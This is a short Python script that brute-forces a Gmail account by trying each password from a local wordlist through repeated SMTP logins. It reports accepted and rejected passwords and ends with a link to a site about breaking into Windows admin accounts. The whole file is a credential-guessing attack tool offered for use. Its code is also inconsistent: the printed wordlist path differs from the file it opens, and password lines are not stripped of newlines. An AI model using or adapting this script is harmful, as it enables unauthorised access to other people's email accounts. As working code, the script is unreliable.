import smtplib
import time
#http://codingbat.com/python

server = smtplib.SMTP("smtp.gmail.com", 587) #opens gmail smtp connection and port 587
server.ehlo()
server.starttls()

print ("make sure that the password list is at C:\passwordlist.txt")
user = input ("Enter gmail account name:")
wordlist = open ("C:\pass.txt", "r")
try:
	for passw in wordlist:
		try:
			server.login(user, passw)
			print ("password accepted \npassword: " + passw)
			time.sleep(10)
			break
		except smtplib.SMTPAuthenticationError:
			print ("password not accepted: " + passw)
except:
	print ("Gmail has blocked you for about 5 minutes")
#go to this site as well http://www.hackingmadeeasy.com/hack_windows_admin.htm
